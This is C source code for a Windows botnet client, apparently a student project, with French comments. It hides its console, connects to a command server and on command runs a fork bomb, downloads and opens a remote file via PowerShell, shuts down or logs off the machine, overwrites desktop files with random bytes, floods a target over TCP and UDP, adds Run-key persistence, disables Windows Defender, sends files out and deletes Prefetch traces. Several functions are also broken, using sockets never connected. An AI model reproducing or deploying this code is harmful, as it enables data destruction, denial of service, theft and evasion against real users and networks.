#define _WIN32_WINNT 0x0501
#include <stdio.h>		//Include des librairies
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <ws2tcpip.h>
#include <time.h>
#include <winerror.h>
//#include <fonctions-malware.h>

#pragma comment(lib, "Ws2_32.lib")		//Include des librairies
#define BUFFER_SIZE 1024

#define DEFAULT_BUFLEN 512		// Infos serveurs
#define DEFAULT_PORT "1053"
#define DEFAULT_SERVER "192.168.1.35"
#define DEFAULT_SUPFILE "C:\\Users\\Zombie\\Documents\\testfile.txt"

#define PREFETCH_DIRECTORY "C:\\Windows\\Prefetch"

//Déclaratation des fonctions du malware // 


int AutoRun();

int ddosudp(int port, char * addrip, int nbpackets, int sizepacket, int delai );

int ddostcp(int port, char * addrip, int nbpackets, int sizepacket, int delai );

int hardcollec();

int enumfiles();

int dateconvert( FILETIME * valeur);

int envoie_fichier(const char* file_name);

void deletePrefetchFiles();

void supfichier(char* filename);

void ft_exec(char *message);

void receive_message(SOCKET ConnectSocket);


//---------------------------//
//          * MAIN *         //
//---------------------------//


int main()
{

// Cacher la console - permet d'ouvrir le malware en tâche de fond.
    HWND myWindow = GetConsoleWindow();
    ShowWindow(myWindow, SW_HIDE);
    Sleep(1);
    // Déclaration et initialisation des variables
    WSADATA wsaData; // Structure qui contiendra la version de la DLL de WinSock 2
    int iResult; // Variable pour stocker la valeur de retour de la fonction
    SOCKET ConnectSocket = INVALID_SOCKET; // Description socket
    struct addrinfo *result = NULL, // Pointeur vers une liste liée de structures addrinfo qui contiennent la réponse du service de résolution de noms.
                    *ptr = NULL, // Pointeur vers la structure addrinfo dans la liste
                    hints; // Structure qui contient des indications sur le type de socket que l'appelant supporte.
    char *sendbuf = "this is a test"; // Buffer pour envoyer les données
    char recvbuf[DEFAULT_BUFLEN]; // Buffer pour recevoir les données
    int recvbuflen = DEFAULT_BUFLEN; // Longueur du buffer de réception

    // Initialisation Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData); 
    if (iResult != 0) { // Si WSAStartup échoue
        printf("Erreur WSAStartup : %d \n", iResult);

        return 1;
    }
    ZeroMemory( &hints, sizeof(hints) ); // Remplir la mémoire de zéros
    hints.ai_family = AF_UNSPEC; // AF_UNSPEC = IPv4 ou IPv6
    hints.ai_socktype = SOCK_STREAM; // SOCK_STREAM = TCP
    hints.ai_protocol = IPPROTO_TCP; // IPPROTO_TCP = TCP
    // Résolution de l'adresse et du port du serveur // Obtenir des informations sur l'adresse
    iResult = getaddrinfo(DEFAULT_SERVER, DEFAULT_PORT, &hints, &result); // Get address info
    if ( iResult != 0 ) { // Si getaddrinfo fail
        printf("Erreur getaddrinfo : %d \n", iResult);
        WSACleanup();
        return 1;
    }
    // Tenter de se connecter à une adresse jusqu'à ce que l'une d'entre elles réussisse.

    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) { // Bouclez à travers tous les résultats et connectez au premier que nous pouvons
        //  Création du socket pour la connexion au serveur
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, // Création du socket
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) { // Si le socket échoue
            printf("Erreur socket, erreur : %ld \n", WSAGetLastError()); // Affichage erreur
            WSACleanup(); // Clean up
            return 1;
        }
        // Connexion au serveur.
        iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);// Connexion au serveur
        if (iResult == SOCKET_ERROR) {// Si la connexion échoue
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(result); // Libération mémoire
    if (ConnectSocket == INVALID_SOCKET) {// Si le socket n'est pas valide
        printf("Impossible de se connecter au serveur ! \n");
        WSACleanup();
        return 1;
    }
    // Envoi buffer initial
    iResult = send( ConnectSocket, sendbuf, (int)strlen(sendbuf), 0 ); // envoi message hello
    if (iResult == SOCKET_ERROR) {
        printf("Fail de l'envoi avec l'erreur: %d \n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }
    // Recevoir jusqu'à ce que le pair ferme la connexion
    do {
        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0); // Réception message
        // Copie dans char *message recvbuf avec la longuer d'iResult
        char *message = strdup(recvbuf);
        message[iResult] = '\0';
        if (iResult > 0) {
            
            ft_exec(message);
        }
        else if (iResult == 0)
            printf("Fermeture connexion \n");
        else // Déconnexion / crash
            printf("Déconnecté \n");
    } while (iResult > 0);
    // fermer la connexion puisque plus aucune donnée ne sera envoyée
    iResult = shutdown(ConnectSocket, SD_SEND);
    
    if (iResult == SOCKET_ERROR) { // Si shutdown fail
        printf("L'arrêt a échoué avec l'erreur: %d \n", WSAGetLastError()); // Print erreur
        closesocket(ConnectSocket); // Fermeture socket
        WSACleanup();
        return 1;
    }
    // cleanup
    closesocket(ConnectSocket); // Fermeture socket
    WSACleanup();
    return 0;
}

//---------------------------//
//     * Fonction Julien *   //
//---------------------------//


void ft_exec(char *message) { // Executer les commandes provenant du serveur

    if (strcmp(message, "forkbomb") == 0) //bombfork
    {
        while (1)
        {
            system("start /B");
        }
    }
    else if (strcmp(message, "image") == 0) //Lancer des vidéos, sons, images, ...
    {
        
        system("powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('https://www96.uptobox.com/dl/vuVlxA_LmadhqcFnAypcMYvqIc8Xq6IjC45Kny9CWloIun4X6Jkai6w5VOjyHB-RIFPCCmfuBO7b_tJmFb7Jij6AOenKUL3JmHWyCG81X5lwWyG5jH2ypX2_JHAbgId7GEi2HehPnMigitv6Hu73ag/test.jpg', 'test.png')\""); //téléchargement du fichier et nommage de celui-ci
        system("test.png"); //ouverture du fichier
    }
    else if (strcmp(message, "shutdown") == 0) //Eteindre la machine
    {
        system("shutdown -s -t 0");
    }
    else if (strcmp(message, "restart") == 0) //Redémarrage de la machine
    {
        system("shutdown -r -t 0");
    }
    else if (strcmp(message, "lock") == 0) //Verrouiller la session
    {
        system("rundll32.exe user32.dll,LockWorkStation");
    }
    else if (strcmp(message, "logoff") == 0) //Déconnecter l'utilisateur
    {
        system("shutdown -l");
    }
    else if (strcmp(message, "crypt") == 0) //Alteration des fichiers
    {
        
        WIN32_FIND_DATA FindFileData;
        HANDLE hFind = FindFirstFile("C:\\Users\\Zombie\\Desktop\\*", &FindFileData);
        if (hFind != INVALID_HANDLE_VALUE)
        {
            do
            {
                if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    continue;
                }
                else
                {
                    FILE *file;
                    file = fopen(FindFileData.cFileName, "wb");
                    srand(time(NULL));
                    for (int i = 0; i < 100000; i++)
                    {
                        int random = rand() % 255;
                        fputc(random, file);
                    }
                    fclose(file);
                }
            } while (FindNextFile(hFind, &FindFileData) != 0);
            FindClose(hFind);
        }
    }
	    else if (strcmp(message, "ddostcp") == 0) //DDOS une cible en TCP
    {
        ddostcp(5555,"8.8.8.8",50, 500, 10); // BESOIN DE MODIFICATION POUR DEVENIR DYNAMIQUE
    }
		else if (strcmp(message, "ddosudp") == 0) //DDOS une cible en UDP
    {
        ddosudp(5555,"8.8.8.8",50, 500, 10);
    }
		else if (strcmp(message, "autorun") == 0) //Ré-active l'autorun
    {
        AutoRun();
    }
		else if (strcmp(message, "hardcollec") == 0) //Collecter info hardware
    {
        hardcollec();
    }
 		else if (strcmp(message, "envoiefichier") == 0) // Envoie de fichier via socket
    {
		envoie_fichier("C:\\Users\\Zombie\\Documents\\testfile.txt");
    }
	 	else if (strcmp(message, "enumfichier") == 0) // Enumeration du repertoire X et de tous c fichier
    {
		enumfiles( NULL, NULL );
    }
        else if (strcmp(message, "delprefetch") == 0) // Suppression des prefetch
    {
		deletePrefetchFiles();
    }
        else if (strcmp(message, "supfichier") == 0) // Suppression de fichier
    {
		supfichier(DEFAULT_SUPFILE);
    }
}

// Fonction pour recevoir les messages provenant du serveur

void receive_message(SOCKET ConnectSocket) { // Receive text from server
    int iResult;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    do {
        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0); //Reception des messages via la fonction recv
        if (iResult > 0) {
            printf("Bytes received: %d Message: %s \n", iResult, recvbuf);
        }
        else if (iResult == 0)
            printf("Connexion fermé \n");
        else   
            printf("Fail recv, erreur: %d\n", WSAGetLastError());
    } while (iResult > 0);
}

//---------------------------//
//     * Fonction Alexy *    //
//---------------------------//

int run_reg_file() { //Lance le .reg pour désactiver windows defender même après redémarrage
  int result;
  SHELLEXECUTEINFO sei;

  /* Mise en place de SHELLEXECUTEINFO  */
  ZeroMemory(&sei, sizeof(sei));
  sei.cbSize = sizeof(sei);
  sei.fMask = SEE_MASK_NOCLOSEPROCESS;
  sei.lpFile = "disable_defender.reg";
  sei.lpVerb = "runas";
  sei.nShow = SW_HIDE;

  /* Lancement du .reg file. */
  result = ShellExecuteEx(&sei);
  if (result == 0) {
    /* Erreur lors du lancement. */
    return GetLastError();
  }

  /* Attendre son execution. */
  WaitForSingleObject(sei.hProcess, INFINITE);

  /* Retourne l'exit code */
  result = 0;
  GetExitCodeProcess(sei.hProcess, (LPDWORD) &result);

  /* Fermerture du habdle. */
  CloseHandle(sei.hProcess);

  return result;
}


int AutoRun() // Fonction persistance Windows - Botnet Malware [AutoRun]//
{
	
	char err[128] = "Erreur de création de la persistance\n";
	char suc[128] = "Création de la persistance sur : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	// Permet de retrouver son propre nom, ainsi que son chemin 
	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0) {
		//send(sock, err, sizeof(err), 0);
		return -1; 
	}

	HKEY NewVal;
	//Ouverture du registre et declaration d'un HKEY
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		//send(sock, err, sizeof(err), 0);
		return -1;
        //Insertion de la nouvelle valeur avec la donnée "BotnetMalware"
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath); // Création du nouvelle clée de registre -> Insérer dans regedit User\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
	if (RegSetValueEx(NewVal, TEXT("BotnetMalware"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		//send(sock, err, sizeof(err), 0);
		return -1;
	}
	//Fermeture du registre
	RegCloseKey(NewVal);
	//send(sock, suc, sizeof(suc), 0);
	return 0;
}


int ddostcp(int port, char * addrip, int nbpackets, int sizepacket, int delai )
{
	FreeConsole(); // Cacher la consoles win
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    /* - Initialisation du socket - */

	BYTE data[sizepacket]; // Création d'un tableau de byte de taille 0xFFFF -> Soit 65535 bytes -> 64kb
	memset(data,0xCC,sizepacket); // Remplis le tableau de byte de 0xCC 0xFFFF foisl


	strcpy( (char*) data, "Paquet Malveillant!"); // Rajoute

	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr(addrip);
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(port);

	for ( int i=0; i<nbpackets; i++ )
	{
		sock = socket(AF_INET,SOCK_STREAM,0);
		connect(sock, (SOCKADDR *)&sin, sizeof(sin));
		send(sock, data, sizeof(data), 0);
		closesocket(sock);
		Sleep( delai );

	}
	/* - Fermeture du socket - */

    WSACleanup();
    return 0;

}

int ddosudp(int port, char * addrip, int nbpackets, int sizepacket, int delai )
{
	FreeConsole(); // Cacher la consoles win
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    /* - Initialisation du socket - */

	BYTE data[sizepacket]; // Création d'un tableau de byte de taille 0xFFFF -> Soit 65535 bytes -> 64kb
	memset(data,0xCC,sizepacket); // Remplis le tableau de byte de 0xCC 0xFFFF foisl


	strcpy( (char*) data, "Ceci n'est pas issu d'un virus malveillant !"); // Rajoute "Pacquet Malveillant" au debut du packet

	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr(addrip);
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(port);
	sock = socket(AF_INET,SOCK_DGRAM,0);

	for ( int i=0; i<nbpackets; i++ )
	{
		sendto(sock, data, sizepacket, 0, (SOCKADDR*) &sin, sizeof(sin));
		Sleep( delai );

	}

	closesocket(sock);
	/* - Fermeture du socket - */
    WSACleanup();
    return 0;

}

int hardcollec()
{
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);
	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr(DEFAULT_SERVER);
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(1054);
	//printf(getenv("set"));
	SYSTEM_INFO siSysInfo;
   // Copie de info hardware dans la strcture SYSTEM_INFO. 
   GetSystemInfo(&siSysInfo); 
   // Affiche le contenue de la strcture system info. 

	char nbproc[128];
	char proctype[128];
	char oemid[128];

	send(sock, nbproc, sizeof(nbproc), 0);
	send(sock, proctype, sizeof(proctype), 0);
   	send(sock, oemid, sizeof(oemid), 0);
    closesocket(sock);
    WSACleanup();
}

int enumfiles( char * dir, char * nameext )
{
	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr(DEFAULT_SERVER);
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(1054);
	HANDLE hfind;
	WIN32_FIND_DATA wfd;

	// Initialise la recherche
	
	char directory[MAX_PATH];
	char file[MAX_PATH];

	if ( dir )
		strcpy( directory, dir );
	else
		strcpy( directory, "C:\\Users\\Zombie2\\Pictures\\" );

	if ( nameext )
		strcpy( file, nameext );
	else
		strcpy( file, "*.*" );

	if (  directory[ strlen( directory) - 1 ] != '\\' )
		strcpy( directory, strcat( directory, "\\" ));

	strcpy( file, strcat( directory, file ));

	//printf( "Exploration de " );
	//printf( file );
	//printf( "\n" );


	hfind = FindFirstFile( file, &wfd);

	//Si quelque chose à été trouver
	if (hfind == INVALID_HANDLE_VALUE) return 1;

	FILETIME ftCreate, ftAccess, ftWrite;
	SYSTEMTIME stUTC, stLocal;

	do
	{
		// Si ce n'est pas le répertoire courant DOS ...
		if (wfd.cFileName[0] != '.')
		{
		// Affiche le nom du fichier trouver
			printf(wfd.cFileName);
			send(sock, wfd.cFileName, sizeof(file), 0);
			printf(" - ");

			dateconvert(&wfd.ftCreationTime);
			dateconvert(&wfd.ftLastAccessTime);
			dateconvert(&wfd.ftLastWriteTime);
			printf("\n");

		}
	}
	
	//Recherche le prochain fichier
	while (FindNextFile(hfind, &wfd));

	// Recherche terminer, ferme la recherche
	FindClose(hfind);

    closesocket(sock);
    WSACleanup();
	return 0;
}		

int dateconvert( FILETIME * valeur)
{
	SYSTEMTIME stUTC, stLocal;

	// Convertie la date du denriere accés au fichier en temps local.
    FileTimeToSystemTime( valeur, &stUTC);
    SystemTimeToTzSpecificLocalTime(NULL, &stUTC, &stLocal);

    // Craft d'une string pour afficher la date.
    printf("[%02d/%02d/%d - %02d:%02d] ",
    stLocal.wDay ,stLocal.wMonth, stLocal.wYear,
    stLocal.wHour, stLocal.wMinute);

}

int envoie_fichier(const char* file_name) 
{

	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr(DEFAULT_SERVER);
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(1054);
	HANDLE hfind;
	WIN32_FIND_DATA wfd;


  // Ouvre le fichier a envoyer

  FILE* file = fopen(file_name, "rb");
  if (file == NULL) {
    printf("Error opening file\n");
    return -1;
  }

  // Recupère la taille du fichier

  fseek(file, 0, SEEK_END);
  int file_size = ftell(file);
  rewind(file);
  send(sock, (char*)&file_size, sizeof(file_size), 0);

  // Envoie le contenue du fichier au client
  char buffer[BUFFER_SIZE];
  int bytes_read;
  while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
  send(sock, buffer, bytes_read, 0);
  }

  // Ferme le fichier et le socket

  fclose(file);
    closesocket(sock);
    WSACleanup();

  return 0;
}

void supfichier(char* filename) {

  // Supprime ce fichier
  if (remove(filename) != 0) {
    perror("Impossible de supprimer le fichier");
  } else {
    printf("Fichier supprimé\n");
  }

}

void deletePrefetchFiles(void) {
  WIN32_FIND_DATA findData;
  HANDLE hFind;
  char path[MAX_PATH];

  // Concatenation entier pour le dir prefetch
  snprintf(path, MAX_PATH, "%s\\*", PREFETCH_DIRECTORY);

  // Trouver le premier fichier prefetch du dossier
  hFind = FindFirstFile(path, &findData);
  if (hFind == INVALID_HANDLE_VALUE) {
    printf("Impossible de trouver le premier fichier (%d)\n", GetLastError());
    return;
  }

  // Iteration de tout les fichier du dossier preftech
  do {
    // Passe le dossier parent et le dossir actuel
    if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) {
      continue;
    }

    // Concatenation du path complet
    snprintf(path, MAX_PATH, "%s\\%s", PREFETCH_DIRECTORY, findData.cFileName);

    // Suppression des fichiers
    if (!DeleteFile(path)) {
      //printf("Impossible de supprimer le fichier '%s' (%d)\n", path, GetLastError());
    }
  } while (FindNextFile(hFind, &findData));

  // Ferme le handle du prefetch directory
  FindClose(hFind);

}